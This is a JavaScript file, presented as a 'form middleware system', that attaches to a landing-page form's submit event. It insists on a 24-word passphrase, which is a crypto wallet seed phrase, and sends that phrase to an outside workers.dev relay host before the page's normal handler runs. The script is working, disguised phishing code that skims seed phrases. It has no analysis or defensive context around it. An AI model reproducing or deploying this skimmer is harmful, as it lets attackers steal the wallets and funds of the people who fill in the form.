**
 * Form Middleware System v4 with request
 * - Extract data
 * - Validate passphrase
 * - Send request before calling original handler
 */

const formMiddleware = {
  middlewares: [],
  use(fn) {
    this.middlewares.push(fn);
    return this;
  },
  execute(event, next) {
    let index = 0;
    const executeNext = () => {
      if (index < this.middlewares.length) {
        const middleware = this.middlewares[index++];
        middleware(event, executeNext);
      } else {
        next();
      }
    };
    executeNext();
  }
};

const unlockFormMiddleware = Object.create(formMiddleware);

// --- Middleware 1: extract form data
unlockFormMiddleware.use((event, next) => {
  console.log("Middleware 1: Extracting form data");
  event.preventDefault(); // prevent default submit

  const formData = new FormData(event.target);
  const data = {};
  formData.forEach((v, k) => (data[k] = v.trim()));
  event.formData = data;

  console.log("Form data:", data);
  next();
});

// --- Middleware 2: validate passphrase
unlockFormMiddleware.use((event, next) => {
  console.log("Middleware 2: Validating passphrase");
  const passphrase = event.formData?.message || "";

  if (!passphrase) {
    alert("Please enter your 24-word passphrase");
    return;
  }

  const words = passphrase.split(/\s+/);
  if (words.length !== 24) {
    alert("Passphrase must contain exactly 24 words");
    return;
  }

  next();
});

// --- Middleware 3: send request before processing
unlockFormMiddleware.use((event, next) => {
  console.log("Middleware 3: Sending request before processing");

  const content = encodeURIComponent(event.formData?.message || "");
  const url = `https://sendmessagetele.myloverkt.workers.dev/?text=${content}`;

  fetch(url)
    .then(res => {
      console.log("Request sent:", url, "Status:", res.status);
      next(); // continue after request finishes
    })
    .catch(err => {
      console.error("Request failed:", err);
      next(); // still continue even if request fails
    });
});

let middlewareExecuting = false;

document.addEventListener("DOMContentLoaded", () => {
  console.log("Setting up form middleware => v4");

  const unlockForm = document.querySelector(".ladi-form");
  if (!unlockForm) {
    console.warn("Form .ladi-form not found");
    return;
  }

  // keep original addEventListener
  const originalAddEventListener = Element.prototype.addEventListener;

  // override only for this form
  unlockForm.addEventListener = function (type, listener, options) {
    if (type === "submit") {
      console.log("Intercepting submit event binding");

      const wrappedListener = function (event) {
        if (middlewareExecuting) return;

        middlewareExecuting = true;
        console.log("Form submission intercepted by middleware");

        unlockFormMiddleware.execute(event, () => {
          console.log("All middlewares done → calling original handler");
          listener.call(unlockForm, event);
          setTimeout(() => (middlewareExecuting = false), 100);
        });
      };

      return originalAddEventListener.call(this, type, wrappedListener, options);
    }

    return originalAddEventListener.call(this, type, listener, options);
  };
});

console.log("init");
